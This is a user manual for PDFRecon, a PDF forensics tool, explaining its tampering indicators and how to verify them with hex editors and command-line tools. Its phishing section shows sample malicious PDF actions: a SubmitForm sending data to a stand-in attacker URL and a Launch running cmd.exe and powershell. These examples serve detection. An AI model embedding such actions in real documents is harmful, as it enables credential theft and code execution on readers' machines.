# PDFRecon - Forensic Analysis Manual

## Introduction
PDFRecon is a forensic tool designed to assist in the investigation of PDF files. The program analyzes files for technical indicators that reveal alteration, editing, or hidden content. This manual explains each indicator, what it means forensically, and provides detailed instructions for manually verifying findings using hex editors and command-line tools.

## Important Note on Timestamps
The 'File Created' and 'File Modified' columns show timestamps from the computer's file system. These timestamps can be unreliable—copying a file updates these dates to the time of the copy. For reliable timestamps, use the 'Show Timeline' feature, which extracts metadata from inside the file itself.

---

## Classification System

<red><b>YES (High Risk):</b></red> Strong evidence of alteration found. These files should always be thoroughly investigated.

<yellow><b>Indications Found (Medium Risk):</b></yellow> Technical traces deviating from a standard, 'clean' PDF. Warrant closer examination.

<green><b>NOT DETECTED (Low Risk):</b></green> No known indicators found.

---

## General Usage (GUI)

### Basic workflow
1. **Launch PDFRecon** (run `app.py` or `PDFRecon.exe`).
2. **Choose folder and scan** – Click the main button to select a folder containing PDFs. The app scans recursively and lists all PDFs with detected indicators.
3. **Review the table** – Rows are colour-coded: red = high confidence of alteration, yellow = indications found, green = no indicators. Use the "Signs of Alteration" column and filters to focus.
    4. **Inspector** – Select a file to open the Inspector. Use the tabs: **Details** (all indicators and notes), **EXPTool** (ExifTool output), **Timeline**, **History & Relationships**, and **PDF Viewer** (visual view with optional overlays for TouchUp, ELA, JPEG anomalies, duplicate images, etc.).
    5. **Save case** – Use **File → Save Case As...** to save the session as a `.prc` case file. You can later open it with **File → Open Case...** and continue (add notes, export, verify integrity).
    6. **Export** – Use **Export Report** to export to Excel, CSV, JSON, or HTML. All exports can be digitally signed (SHA-256 sidecar and optional detached signature) and logged to the chain of custody when a case is loaded.
    7. **Notes** – Right‑click a file → **Note** to add investigator notes; they are stored in the case and marked dirty until you save the case.
    8. **Verify integrity** – With a case loaded, **File → Verify integrity** compares current file hashes to the stored evidence hashes and reports changes.
    9. **Audit Log** – View the full Chain of Custody record via **File → Show audit log**.

### Keyboard and navigation
- **Arrow keys (Up/Down)** – Move selection in the file list (one row at a time). Works when the Inspector is open as well.
- **Right‑click** – Context menu: View PDF, Show Timeline, Revision History, Visual Diff (for revisions), Note, etc.

---

## CLI Usage

PDFRecon provides a command-line interface for scripting and automation. Run from the project root: `python cli.py <command> ...` (or `pdfrecon` if installed).

### Commands

**`scan <directory>`** – Scan a folder for PDFs and create a case file and optional chain-of-custody log.

```bash
python cli.py scan C:\Evidence\PDFs
python cli.py scan C:\Evidence\PDFs --output-dir C:\Cases -j 4
python cli.py scan C:\Evidence\PDFs --custody-log C:\Cases\custody.log
```

| Option | Description |
|--------|-------------|
| `dir` | Directory to scan for PDFs (required) |
| `--output-dir`, `-o` | Output directory for the case file (default: same as scan directory) |
| `--custody-log`, `-c` | Path to chain-of-custody log file |
| `--jobs`, `-j` | Number of parallel workers (default: CPU count − 1) |

The case file is saved as `case_cli_YYYYMMDD_HHMMSS.prc` in the output directory.

**`export-signed <case file>`** – Export a digitally signed report from an existing `.prc` case file.

```bash
python cli.py export-signed C:\Cases\case_cli_20250101_120000.prc
python cli.py export-signed case.prc --output report.json --custody --sign-key key.pem
```

| Option | Description |
|--------|-------------|
| `case` | Path to `.prc` case file (required) |
| `--output` | Output report path (default: &lt;case&gt;.signed_report.json) |
| `--custody` | Append export event to chain-of-custody log |
| `--sign-key` | Path to PEM private key for detached signature (optional) |

**`extract-js <PDF file>`** – Extract embedded JavaScript from a PDF (e.g. for malicious file analysis).

```bash
python cli.py extract-js suspicious.pdf
python cli.py extract-js suspicious.pdf --output scripts.txt
```

| Option | Description |
|--------|-------------|
| `file` | PDF file path (required) |
| `--output`, `-o` | Write extracted scripts to file (default: stdout) |

**Version:** `python cli.py --version`

---

## Recommended Tools for Manual Analysis

| Tool | Purpose | Download |
|------|---------|----------|
| HxD | Free hex editor for Windows | https://mh-nexus.de/en/hxd/ |
| 010 Editor | Professional hex editor with templates | https://www.sweetscape.com/010editor/ |
| QPDF | PDF manipulation and decompression | https://github.com/qpdf/qpdf |
| mutool | PDF inspection (part of MuPDF) | https://mupdf.com/ |
| ExifTool | Metadata extraction | https://exiftool.org/ |
| pdfimages | Extract images from PDF | Part of poppler-utils |

---

# HIGH-CONFIDENCE INDICATORS (YES - Red Flag)

---

## Timestamp Spoofing (Backdating)
**Classification:** <red>YES</red>

**What it means:** The file system creation date is significantly older than the internal PDF creation date. This is physically impossible under normal circumstances and strongly indicates the system clock was rolled back or the file timestamp was artificially manipulated (timestomped).

### Manual Parsing Instructions:

**Step 1: Check File System Timestamps**
1. Right-click the file in Windows -> Properties -> Details
2. Note the "Date created"

**Step 2: Check PDF Internal Timestamps**
1. Use ExifTool or open the PDF in a hex editor
2. Search for `/CreationDate`
3. Decode the timestamp format (e.g., `D:YYYYMMDDHHmmSS`)

**Step 3: Compare Timestamps**
If the external File System creation date is *older* than the internal PDF `/CreationDate`, the file has been tampered with.

---

## Phishing Directives (SubmitForm / Launch)
**Classification:** <red>YES</red>

**What it means:** The PDF contains actions that can submit form data to an external URL or launch external files/applications. These are commonly used in malicious phishing PDFs.

### Manual Parsing Instructions:

**Step 1: Search for Actions**
Search for `/Action` dictionaries. Specifically, look for:
- `/S /SubmitForm`
- `/S /Launch`

**Step 2: Decode the Actions**
For `/SubmitForm`:
Search near the action for `/F` to find the target URL where data is being sent.
```
/Action <<
  /S /SubmitForm
  /F (http://malicious-site.com/login.php)
>>
```

For `/Launch`:
Search for `/F` or `/Win` dictionaries to see what file or application is being executed.
```
/Action <<
  /S /Launch
  /F (cmd.exe)
  /Win << /F (cmd.exe) /P (/c powershell.exe ...) >>
>>
```

---

## TouchUp_TextEdit
**Classification:** <red>YES</red>

**What it means:** Adobe Acrobat's TouchUp Text tool leaves this metadata flag when text is manually edited in a PDF.

### Manual Parsing Instructions:

**Step 1: Open in Hex Editor**
1. Open the PDF file in HxD or similar hex editor
2. Press Ctrl+F to open Find dialog
3. Select "Text-string" search mode

**Step 2: Search for the indicator**
Search for these strings (case-insensitive):
- `TouchUp_TextEdit`
- `/LastModified`
- `/PieceInfo`

**Step 3: Decode the context**
When found, the surrounding structure typically looks like:
```
/PieceInfo <<
  /AdobePhotoshop <<
    /LastModified (D:20240115143000+01'00')
    /Private <<
      /TouchUp_TextEdit true
    >>
  >>
>>
```

**Hex representation:**
```
2F 50 69 65 63 65 49 6E 66 6F = /PieceInfo
2F 54 6F 75 63 68 55 70 = /TouchUp
```

**What to document:**
- Byte offset where found
- The `/LastModified` timestamp (format: D:YYYYMMDDHHmmSS±HH'mm')
- Screenshot of the hex context

---

## Has Revisions (Incremental Updates)
**Classification:** <red>YES</red>

**What it means:** PDF was modified after creation. Previous versions are preserved inside the file.

### Manual Parsing Instructions:

**Step 1: Count %%EOF markers**
1. In hex editor, search for `%%EOF` (hex: `25 25 45 4F 46`)
2. Note the byte offset of EACH occurrence
3. More than 1 = file has revisions

**Step 2: Extract revisions manually**
Each `%%EOF` marks the end of a complete PDF version:
```
Bytes 0 to first %%EOF = Oldest version (Revision 1)
Bytes 0 to second %%EOF = Second version (Revision 2)
...
Bytes 0 to last %%EOF = Current version
```

**Step 3: Extract a revision**
1. Note the byte offset of the `%%EOF` you want (e.g., offset 45000)
2. In HxD: Edit → Select Block → Start: 0, End: 45004 (offset + 5 for "%%EOF")
3. Copy and paste into new file
4. Save as `filename_rev1.pdf`

**Using QPDF to extract:**
```bash
# Show all %%EOF positions
grep -boa "%%EOF" file.pdf

# Extract specific byte range (example: first 45005 bytes)
head -c 45005 file.pdf > revision1.pdf
```

**Step 4: Verify the /Prev chain**
Search for `/Prev` followed by a number:
```
/Prev 12345
```
This number points to the byte offset of the previous cross-reference table.

**Hex pattern for /Prev:**
```
2F 50 72 65 76 20 = /Prev 
```

---

## JavaScript Auto-Execute
**Classification:** <red>YES</red>

**What it means:** PDF runs JavaScript when opened, potentially modifying content dynamically.

### Manual Parsing Instructions:

**Step 1: Search for OpenAction**
Search for `/OpenAction` (hex: `2F 4F 70 65 6E 41 63 74 69 6F 6E`)

**Step 2: Check what it triggers**
The OpenAction typically references a JavaScript action:
```
/OpenAction <<
  /S /JavaScript
  /JS (app.alert\("Hello"\);)
>>
```

Or indirect reference:
```
/OpenAction 15 0 R
```
Then find object 15 to see the JavaScript.

**Step 3: Find and decode JavaScript**
Search for `/JS` followed by:
- Direct string: `/JS (javascript code here)`
- Hex string: `/JS <68656C6C6F>` (decode hex to ASCII)
- Stream reference: `/JS 20 0 R` (find object 20)

**Decoding hex-encoded JavaScript:**
```
Hex: 61 70 70 2E 61 6C 65 72 74
ASCII: a  p  p  .  a  l  e  r  t
```

**Step 4: Check Additional Actions (AA)**
Search for `/AA` which defines actions on various triggers:
```
/AA <<
  /O << /S /JavaScript /JS (...) >>  % Open page
  /C << /S /JavaScript /JS (...) >>  % Close page
>>
```

---

## Dangling References
**Classification:** <red>YES</red>

**What it means:** PDF references objects (e.g., via the Cross-reference table) that don't exist in the file. This indicates partial deletion of content, corruption, or improper editing.

### Manual Parsing Instructions:

**Step 1: Find all object definitions**
Search for pattern `X Y obj` where X and Y are numbers:
```
Regex: \d+ \d+ obj
```
Example: `5 0 obj` defines object 5, generation 0

**Step 2: Find all object references**
Search for pattern `X Y R`:
```
Regex: \d+ \d+ R
```
Example: `5 0 R` references object 5

**Step 3: Compare lists**
- Create list of all defined object numbers
- Create list of all referenced object numbers
- Any reference without a definition = MISSING

**Using command line:**
```bash
# List all object definitions
grep -oP '\d+(?= 0 obj)' file.pdf | sort -n | uniq > defined.txt

# List all object references  
grep -oP '\d+(?= 0 R)' file.pdf | sort -n | uniq > referenced.txt

# Find missing (referenced but not defined)
comm -23 referenced.txt defined.txt
```

---

## Structural Scrubbing Analysis
**Classification:** <red>YES</red>

**What it means:** Large blocks of null bytes (`0x00`) or excessive consecutive spaces found in the file structure. This is a common sign of "manual scrubbing" where data has been erased by overwriting bytes instead of properly regenerating the PDF structure.

### Manual Parsing Instructions:

**Step 1: Open in Hex Editor**
Search for hex patterns:
- Null blocks: `00 00 00 00 00` (search for 50+ consecutive)
- Space blocks: `20 20 20 20 20` (search for 200+ consecutive)

**Step 2: Compare with typical PDF markers**
Legitimate PDFs rarely have large gaps of hundreds of nulls unless they are aligned to specific XREF stream boundaries. Large runs of spaces in the middle of a stream often indicate erased text.

---

## PDF/A Compliance Violation
**Classification:** <red>YES</red>

**What it means:** The document claims to be a PDF/A (Archival) file, but contains features that are forbidden by the standard (like JavaScript, encryption, or non-embedded fonts). This proves the file was modified after its archival "finalization."

### Manual Parsing Instructions:

**Step 1: Verify PDF/A Claim**
Search for `pdfaid:part` in XMP metadata.

**Step 2: Check for Violations**
Search for the following prohibited elements:
- `/Encrypt` dictionary.
- `/JS` or `/JavaScript` entries.
- Non-embedded fonts (see Non-Embedded Font Alarm section).

---

# MEDIUM-CONFIDENCE INDICATORS (Indications Found - Yellow)

---

## Hidden Annotations
**Classification:** <yellow>Indications Found</yellow>

**What it means:** The PDF contains annotations (like text boxes, links, or file attachments) with the `Hidden` or `Invisible` flags set. This may indicate an attempt to obscure content or smuggle data inside the PDF without it being visible when printed or viewed.

### Manual Parsing Instructions:

**Step 1: Find Annotation Arrays**
Search for `/Annots` which lists annotations for a page.

**Step 2: Inspect Annotation Flags**
Find the individual annotation object (e.g., `/Type /Annot`). Look for the `/F` (Flags) integer:
```
10 0 obj
<<
  /Type /Annot
  /Subtype /Text
  /F 2
>>
```

**Step 3: Decode Flag Values**
The `/F` entry is a bitmask.
- Bit 1 (value 1): Invisible (If set, do not display)
- Bit 2 (value 2): Hidden (Do not display or print)
- Bit 6 (value 32): NoView (Do not display on screen)

If the integer has bit 2 (Hidden) or bit 1 (Invisible) set, it is suspicious.

---

## Multiple Font Subsets
**Classification:** <yellow>Indications Found</yellow>

**What it means:** Same font style embedded multiple times with different subsets suggests text was added at different times.

### Manual Parsing Instructions:

**Step 1: Find all font definitions**
Search for `/BaseFont` (hex: `2F 42 61 73 65 46 6F 6E 74`)

**Step 2: List all font names**
Font subsets have format: `XXXXXX+FontName`
Example:
```
/BaseFont /AAAAAA+Arial-Regular
/BaseFont /BBBBBB+Arial-Regular   ← Same font, different prefix = SUSPICIOUS
/BaseFont /CCCCCC+Arial-Bold      ← Different style = NORMAL
```

**Step 3: Extract unique prefixes per font style**
```bash
grep -oP '/BaseFont /[A-Z]{6}\+\S+' file.pdf | sort | uniq
```

**What's suspicious:**
- `AAAAAA+TimesNewRoman` AND `BBBBBB+TimesNewRoman` = Text added later
- `AAAAAA+Arial-Bold` AND `BBBBBB+Arial-Regular` = Normal (different styles)

---

## Multiple Creators / Producers
**Classification:** <yellow>Indications Found</yellow>

**What it means:** File was processed by multiple programs.

### Manual Parsing Instructions:

**Step 1: Find the Info dictionary**
Search for `/Creator` and `/Producer`:
```
/Creator (Microsoft Word)
/Producer (Adobe PDF Library 15.0)
```

**Step 2: Check XMP metadata**
Search for `<xmp:CreatorTool>` and `<pdf:Producer>`:
```xml
<xmp:CreatorTool>Microsoft Word</xmp:CreatorTool>
<pdf:Producer>Adobe PDF Library</pdf:Producer>
```

**Step 3: Look for multiple values**
Search entire file for ALL occurrences of `/Creator` and `/Producer`.
Different values in different locations = multiple tools used.

**Decoding parentheses strings:**
```
/Creator (Microsoft\256 Word)
```
`\256` = octal for ® (registered trademark symbol)

Common escape sequences:
- `\n` = newline
- `\r` = carriage return  
- `\t` = tab
- `\(` = literal (
- `\)` = literal )
- `\\` = literal \
- `\ddd` = octal character code

---

## xmpMM:History
**Classification:** <yellow>Indications Found</yellow>

**What it means:** XMP metadata contains editing history with timestamps and tools used.

### Manual Parsing Instructions:

**Step 1: Find XMP metadata stream**
Search for `<?xpacket begin` or `<x:xmpmeta`

**Step 2: Locate history section**
Find `<xmpMM:History>` tag

**Step 3: Parse each history entry**
```xml
<xmpMM:History>
  <rdf:Seq>
    <rdf:li rdf:parseType="Resource">
      <stEvt:action>created</stEvt:action>
      <stEvt:instanceID>xmp.iid:abc123</stEvt:instanceID>
      <stEvt:when>2024-01-10T09:30:00+01:00</stEvt:when>
      <stEvt:softwareAgent>Adobe InDesign 15.0</stEvt:softwareAgent>
    </rdf:li>
    <rdf:li rdf:parseType="Resource">
      <stEvt:action>saved</stEvt:action>
      <stEvt:instanceID>xmp.iid:def456</stEvt:instanceID>
      <stEvt:when>2024-01-15T14:30:00+01:00</stEvt:when>
      <stEvt:softwareAgent>Adobe Acrobat Pro DC</stEvt:softwareAgent>
      <stEvt:changed>/</stEvt:changed>
    </rdf:li>
  </rdf:Seq>
</xmpMM:History>
```

**Key fields to extract:**
| Field | Meaning |
|-------|---------|
| stEvt:action | What happened (created, saved, converted, etc.) |
| stEvt:when | ISO 8601 timestamp |
| stEvt:softwareAgent | Tool used |
| stEvt:instanceID | Unique ID for this version |
| stEvt:changed | What was modified |

---

## Document ID Mismatch
**What it means:** Document IDs don't match, indicating merging or extensive modification.

---

## History & Relationships (xmpMM & Revisions)
**Classification:** <yellow>Indications Found</yellow>

**What it means:** This tab combines two types of history: logical metadata relationships (XMP Asset Relationships) and physical incremental saves (Revisions).

- **Derivation (Source)**: Identifies the immediate parent document from which this asset was created.
- **Ingredients**: Lists component assets (images, PDFs) that were imported or placed into the document. If a related file is found in the case material, you can navigate directly to it.
- **Pantry**: Contains the complete embedded XMP packets for ingredient assets, allowing deep forensic inspection of components.
- **Revisions**: Displays timestamps and specific changes for each physical save operation (e.g., after digital signing or Acrobat edits).

> [!NOTE]
> Placeholder IDs like `xmp.did:...` are automatically suppressed in the UI to reduce clutter. A document showing real IDs in these fields has a more traceable provenance than one with only placeholders. If a related file cannot be found in the case, it is marked as "(not found)".

---

## Forensic Anomalies in Document History
**Classification:** <red>YES</red> (if anomalies found)

**What it means:** A contradiction exists within the metadata regarding document identity or component origin.

- **ID Mismatch**: The Document ID referenced in an `xmpMM:Ingredients` entry does not match the Document ID found in the corresponding `xmpMM:Pantry` packet.
- **Interpretation**: This strongly suggests that an asset was replaced, or that metadata was manually adjusted to hide the true origin of a component.

### Manual Parsing Instructions:

**Step 1: Find Trailer ID**
Search for `/ID` near end of file:
```
/ID [<A1B2C3D4E5F6...> <F6E5D4C3B2A1...>]
```
- First hex string = Original document ID (set at creation)
- Second hex string = Instance ID (changes each save)

**Step 2: Compare the IDs**
If they're different, the file was saved at least once after creation.

**Step 3: Find XMP IDs**
Search for:
```xml
<xmpMM:DocumentID>uuid:A1B2C3D4-E5F6-...</xmpMM:DocumentID>
<xmpMM:InstanceID>xmp.iid:F6E5D4C3-B2A1-...</xmpMM:InstanceID>
<xmpMM:OriginalDocumentID>uuid:ORIGINAL-ID-HERE</xmpMM:OriginalDocumentID>
```

**Step 4: Check for ID changes**
If `OriginalDocumentID` ≠ `DocumentID`, the document was derived from another.

---

## Non-Embedded Font Alarm
**Classification:** <yellow>Indications Found</yellow>

**What it means:** The PDF uses a font that is not embedded in the file. While sometimes done to save space, it is a hallmark of post-creation edits using Acrobat's "TouchUp" or "Edit PDF" tools, which often use system fonts without embedding them into the document.

### Manual Parsing Instructions:

**Step 1: Check Font Properties**
In Adobe Acrobat/Reader: File → Properties → Fonts.
Look for any font that does *not* have "(Embedded)" or "(Embedded Subset)" next to its name.

**Step 2: Inspect via Hex**
Find the font dictionary (e.g., `/Type /Font`). Look for these keys:
- `/FontFile` (for Type 1)
- `/FontFile2` (for TrueType)
- `/FontFile3` (for OpenType/CIDFont)

If these keys are missing, the font is NOT embedded.

---

## XMP History Sequence Gap
**Classification:** <yellow>Indications Found</yellow>

**What it means:** The metadata history (`xmpMM:History`) contains entries that are either out of chronological order or have massive, suspicious gaps in time. This suggests that history entries may have been manually deleted to hide specific editing steps.

### Manual Parsing Instructions:

**Step 1: Locate History RDF**
Search for `<xmpMM:History>` in the XMP metadata stream.

**Step 2: Check Timestamps**
Verify that each `<stEvt:when>` timestamp is later than the previous one. If a "Later" revision has an "Earlier" timestamp, the metadata has been tampered with.

**Step 3: Check for ID gaps**
Review the `<stEvt:instanceID>` sequence. If IDs skip numbers or jump significantly, it may indicate deleted history events.

---

## Multiple startxref
**Classification:** <yellow>Indications Found</yellow>

**What it means:** Multiple cross-reference tables = incremental updates.

### Manual Parsing Instructions:

**Step 1: Search for startxref**
Search for `startxref` (appears near end of each revision)

**Step 2: Note byte offsets**
```
startxref
12345
%%EOF
```
The number (12345) is the byte offset of the cross-reference table.

**Step 3: Follow the xref chain**
1. Go to byte offset indicated by startxref
2. Find `/Prev XXXXX` in the trailer
3. Go to that offset for previous xref table
4. Repeat until no more /Prev entries

**Command line:**
```bash
# Find all startxref positions and their values
grep -A1 "startxref" file.pdf
```

---

## Objects with Generation > 0
**Classification:** <yellow>Indications Found</yellow>

**What it means:** Object was deleted and its number reused, indicating editing.

### Manual Parsing Instructions:

**Step 1: Search for object definitions**
Look for `X Y obj` where Y > 0:
```
15 2 obj
```
This means object 15, generation 2 (was deleted twice and reused).

**Step 2: Check the xref table**
In the cross-reference table:
```
xref
0 20
0000000000 65535 f    ← Free object
0000000015 00000 n    ← Object at offset 15, generation 0
0000001234 00002 n    ← Object at offset 1234, generation 2 (modified!)
```

The format is: `OOOOOOOOOO GGGGG n/f`
- OOOOOOOOOO = 10-digit byte offset
- GGGGG = 5-digit generation number
- n = in use, f = free

---

## White Rectangle Overlay
**Classification:** <yellow>Indications Found</yellow>

**What it means:** White rectangles drawn to hide content—common forgery technique.

### Manual Parsing Instructions:

**Step 1: Decompress content streams**
```bash
qpdf --qdf --object-streams=disable input.pdf readable.pdf
```

**Step 2: Find content streams**
Look between `stream` and `endstream` markers.

**Step 3: Search for white color + rectangle**
Pattern to find:
```
1 1 1 rg        ← Set fill color to white (RGB)
100 200 50 30 re  ← Rectangle at x=100, y=200, width=50, height=30
f               ← Fill the rectangle
```

Or with RG (stroke color):
```
1 1 1 RG        ← Set stroke color to white
```

**Hex pattern for white color:**
```
31 20 31 20 31 20 72 67 = "1 1 1 rg"
```

**Step 4: Map rectangles to page coordinates**
The rectangle coordinates `x y width height re` are in PDF points (1/72 inch).
Compare to visible content to see what's being covered.

---

## Invisible Text (Rendering Mode 3)
**Classification:** <yellow>Indications Found</yellow>

**What it means:** Text exists but is not rendered—hidden content.

### Manual Parsing Instructions:

**Step 1: Decompress PDF**
```bash
qpdf --qdf --object-streams=disable input.pdf readable.pdf
```

**Step 2: Search for text rendering mode**
In content streams, search for `Tr` operator:
```
3 Tr    ← Rendering mode 3 = invisible
(Hidden text here) Tj
0 Tr    ← Back to normal rendering
```

**Rendering modes:**
| Mode | Effect |
|------|--------|
| 0 | Fill text (normal) |
| 1 | Stroke text |
| 2 | Fill then stroke |
| 3 | Invisible |
| 4 | Fill and add to clipping |
| 5 | Stroke and add to clipping |
| 6 | Fill, stroke, add to clipping |
| 7 | Add to clipping |

**Step 3: Extract hidden text**
Text following `3 Tr` until rendering mode changes is invisible.
The text is in parentheses: `(text)` or hex: `<hex>`

---

## Digital Signature Analysis
**Classification:** <yellow>Indications Found</yellow>

**What it means:** Document was signed. Broken signature = modified after signing.

### Manual Parsing Instructions:

**Step 1: Find signature object**
Search for `/Type /Sig`:
```
/Type /Sig
/Filter /Adobe.PPKLite
/SubFilter /adbe.pkcs7.detached
/ByteRange [0 1000 5000 10000]
/Contents <308204...>
```

**Step 2: Understand ByteRange**
`/ByteRange [start1 len1 start2 len2]`
- Bytes 0-999 (first 1000 bytes) are signed
- Bytes 1000-4999 contain the signature itself (excluded)
- Bytes 5000-14999 (next 10000 bytes) are signed
- Total signed = everything except the signature bytes

**Step 3: Verify signature**
```bash
# Using pdfsig (part of poppler-utils)
pdfsig file.pdf

# Using OpenSSL to examine certificate
openssl pkcs7 -in sig.p7s -inform DER -print_certs
```

**Step 4: Check for incremental saves after signing**
If there are `%%EOF` markers AFTER the signature's ByteRange ends, the document was modified after signing.

---

## Timestamp Parsing

### PDF Date Format (Info Dictionary)
Format: `D:YYYYMMDDHHmmSS±HH'mm'`

Example: `D:20240115143052+01'00'`
- Year: 2024
- Month: 01 (January)
- Day: 15
- Hour: 14 (2 PM)
- Minute: 30
- Second: 52
- Timezone: +01:00 (Central European Time)

### XMP Date Format (ISO 8601)
Format: `YYYY-MM-DDTHH:mm:SS±HH:MM`

Example: `2024-01-15T14:30:52+01:00`

### Converting between formats
```python
# PDF to readable
pdf_date = "D:20240115143052+01'00'"
# Extract: 2024-01-15 14:30:52 +01:00

# Timezone offset parsing
# +01'00' means UTC+1
# -05'00' means UTC-5 (Eastern US)
# Z means UTC+0
```

---

## Cross-Reference Table Parsing

### Standard xref format
```
xref
0 6                          ← Starting object 0, 6 entries follow
0000000000 65535 f           ← Object 0: free (f), offset 0, gen 65535
0000000017 00000 n           ← Object 1: in-use (n), offset 17, gen 0
0000000081 00000 n           ← Object 2: offset 81
0000000000 00001 f           ← Object 3: free, gen 1 (was deleted)
0000000331 00000 n           ← Object 4: offset 331
0000000409 00000 n           ← Object 5: offset 409
trailer
<<
  /Size 6                    ← Total objects
  /Root 1 0 R                ← Document catalog
  /Info 5 0 R                ← Info dictionary
  /ID [<abc123> <def456>]    ← Document IDs
  /Prev 12345                ← Previous xref offset (if incremental)
>>
startxref
500                          ← Byte offset of this xref section
%%EOF
```

### Cross-reference Stream (PDF 1.5+)
Modern PDFs may use compressed xref streams instead of text xref tables.
Look for objects with `/Type /XRef`:
```
10 0 obj
<<
  /Type /XRef
  /Size 100
  /W [1 3 1]                 ← Column widths
  /Root 1 0 R
  /Info 5 0 R
>>
stream
[binary data]
endstream
endobj
```

---

## Content Stream Operators Quick Reference

### Text Operators
| Operator | Meaning |
|----------|---------|
| BT | Begin text block |
| ET | End text block |
| Tf | Set font and size: `/F1 12 Tf` |
| Td | Move text position: `100 200 Td` |
| Tm | Set text matrix: `1 0 0 1 100 200 Tm` |
| Tj | Show text: `(Hello) Tj` |
| TJ | Show text with positioning: `[(Hel) -10 (lo)] TJ` |
| Tr | Set rendering mode: `3 Tr` |

### Graphics Operators
| Operator | Meaning |
|----------|---------|
| q | Save graphics state |
| Q | Restore graphics state |
| cm | Concatenate matrix |
| re | Rectangle: `x y w h re` |
| m | Move to: `x y m` |
| l | Line to: `x y l` |
| c | Curve: `x1 y1 x2 y2 x3 y3 c` |
| f | Fill path |
| S | Stroke path |
| rg | Set fill color (RGB): `r g b rg` |
| RG | Set stroke color (RGB): `r g b RG` |

---

## Useful Commands for Manual Analysis

```bash
# Decompress PDF for readable content streams
qpdf --qdf --object-streams=disable input.pdf output.pdf

# Extract all text
pdftotext -layout file.pdf output.txt

# List all objects with types
mutool show file.pdf trailer
mutool show file.pdf xref

# Extract all images
pdfimages -all file.pdf prefix

# Get all metadata
exiftool -a -G -s file.pdf

# Check digital signatures
pdfsig file.pdf

# Find specific byte patterns
xxd file.pdf | grep -i "pattern"

# Extract bytes at specific offset
dd if=file.pdf bs=1 skip=OFFSET count=LENGTH

# Count %%EOF markers
grep -c "%%EOF" file.pdf

# Find all JavaScript
grep -oP '/JS\s*\([^)]+\)' file.pdf
```

---

# FORENSIC GLOSSARY

---

## Quantization Tables (QT) / Digital Fingerprints
**What it is:** A set of 64 numbers used during JPEG compression to determine how much detail is discarded. 
**Forensic Value:** Different devices (Canon, iPhone, HP Scanners) and software (Photoshop, GIMP) use unique tables. These act as a "digital fingerprint."
**Suspicious Findings:**
- **Invalid Fingerprint (QT=1):** Indicates the image was saved with "mathematically perfect" quality, which never happens in real scans but is common in computer-generated fakes.
- **Forged Fingerprint (All values identical):** Real hardware sensors always have variations. Perfectly uniform tables are a sign of artificial creation.
- **Software Match:** If an image's fingerprint matches "Adobe Photoshop," but the file claims to be an "Original Scan," it has been tampered with.

## Error Level Analysis (ELA)
**What it is:** A technique that identifies the "compression age" of different parts of an image.
**Forensic Value:** When an image is modified (e.g., a "copy-paste" edit), the modified area often has a different error level than the original background.
**Suspicious Findings:** High variance in specific areas suggests those parts were added or modified later.

## XREF (Cross-Reference) Table
**What it is:** The "index" of the PDF file that tells the reader where every object (text, image, page) is located.
**Forensic Value:** Deleting objects or adding new ones requires updating the XREF.
**Suspicious Findings:** "Multiple startxref" or "Incremental Updates" mean the index was rebuilt, proving the file was edited after it was first saved.

## Text Operators (TJ / Tj)
**What it is:** The low-level commands that draw text on the page.
**Forensic Value:** Standard software (Word, InDesign) uses very predictable patterns for positioning text.
**Suspicious Findings:** Unusual positioning jumps or mixed rendering modes often indicate manual text insertion.

---

## Complete indicator list (short reference)

This list matches the indicators described elsewhere in the manual and in the app. **YES** = high risk (red); **Indications** = medium (yellow).

| Indicator | Classification | Brief meaning |
|-----------|----------------|---------------|
| Has Revisions | YES | Previous versions preserved in file; proof of post-creation modification. |
| TouchUp_TextEdit | YES | Acrobat TouchUp text tool was used to edit text. |
| JavaScript Auto-Execute / Additional Actions | YES | JavaScript runs on open or has AA triggers. |
| Dangling References | YES | PDF references objects that do not exist. |
| Structural Scrubbing | YES | Large null/space runs indicate manual byte scrubbing. |
| PDF/A Violation | YES | Document claims PDF/A but contains forbidden features. |
| Timestamp Spoofing | YES | File system date older than internal PDF date. |
| Phishing Directives (SubmitForm/Launch) | YES | SubmitForm or Launch actions present. |
| Multiple Font Subsets | Indications | Same font embedded with different subsets; text added at different times. |
| Multiple Creators / Producers | Indications | File processed by more than one application. |
| Document History | Indications | Combined view of XMP relationships and physical revisions in the file. |
| Multiple DocumentID / Trailer ID Change | Indications | Document IDs or instance IDs indicate merging or heavy editing. |
| Non-Embedded Font | Indications | Font not embedded; common after TouchUp/Edit PDF. |
| XMP History Gap | Indications | History entries out of order or with suspicious gaps. |
| Multiple startxref | Indications | Multiple cross-reference tables (incremental saves). |
| Objects with Generation > 0 | Indications | Object numbers reused after deletion. |
| More Layers Than Pages | Indications | Unusual layer count. |
| Linearized / Linearized Updated | Indications | Web-optimized PDF was later modified. |
| Has PieceInfo | Indications | PieceInfo present (e.g. Illustrator). |
| Has Redactions | Indications | Redaction annotations; hidden text may still exist. |
| Has Annotations | Indications | Comments/annotations present. |
| AcroForm NeedAppearances=true | Indications | Form appearance generated at view time. |
| Has Digital Signature | Indications | Document signed; broken signature = modified after signing. |
| Creation/Modification Date Mismatch (Info vs XMP) | Indications | Info and XMP dates inconsistent. |
| Metadata Version Mismatch | Indications | Claims old PDF version but uses modern features. |
| Suspicious Text Positioning | Indications | Unusual density of Tm/Td operators. |
| White Rectangle Overlay | Indications | White shapes drawn over content. |
| Excessive Drawing Operations | Indications | Unusually many drawing commands. |
| Orphaned Objects | Indications | Defined but never referenced. |
| Large Object Number Gaps | Indications | Large gaps in object numbering. |
| Contains JavaScript | Indications | JavaScript present (not necessarily auto-run). |
| Duplicate Images With Different Xrefs | Indications | Same image stored as separate objects. |
| Images With EXIF | Indications | Embedded images contain EXIF. |
| CropBox/MediaBox Mismatch | Indications | Visible area smaller than page; content may be hidden. |
| Excessive Form Fields | Indications | Unusually many form fields. |
| Duplicate Bookmarks | Indications | Bookmarks with identical titles. |
| Invalid Bookmark Destinations | Indications | Bookmarks point to non-existent pages. |
| Starts With Zero Byte | Indications | Null byte before %PDF- header. |
| Possible Email Addresses | Indications | Email addresses in raw data. |
| Possible URLs | Indications | URLs in raw data. |
| JPEG Analysis (quantization tables) | Indications | Suspicious QT fingerprint (e.g. invalid/forged or software match). |
| Error Level Analysis (ELA) | Indications | Embedded images show anomalous compression patterns. |
| Hidden Annotations | Indications | Annotations with Hidden/Invisible flags. |
| Invisible Text (Rendering Mode 3) | Indications | Text not rendered. |
| Digital Signature (analysis) | Indications | Signature present; verify validity and ByteRange. |

---

## Developer and Contact

**Developer:** Rasmus Riis  
**Email:** riisras@gmail.com  
**Project:** PDFRecon – PDF Forensic Analysis Tool  
**Repository:** https://github.com/Rasmus-Riis/PDFRecon

